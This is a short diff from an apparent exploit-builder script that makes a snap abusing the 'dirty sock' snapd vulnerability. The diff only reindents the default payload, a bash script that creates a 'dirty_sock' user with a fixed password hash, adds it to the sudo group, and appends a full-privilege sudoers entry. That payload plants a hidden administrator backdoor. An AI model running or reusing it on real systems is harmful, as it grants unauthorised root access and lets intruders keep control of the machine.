@@ -10,9 +10,9 @@ import time
 
 def parse_arguments():
     default_command = """#!/bin/bash
-    useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
-    usermod -aG sudo dirty_sock
-    echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
+useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
+usermod -aG sudo dirty_sock
+echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
     """
     parser = argparse.ArgumentParser(description='[*] Build a snap that leverages the dirty sock vulnerability')
     parser.add_argument("-u", "--uid", type=int, default=0, help='userid [default=0]')
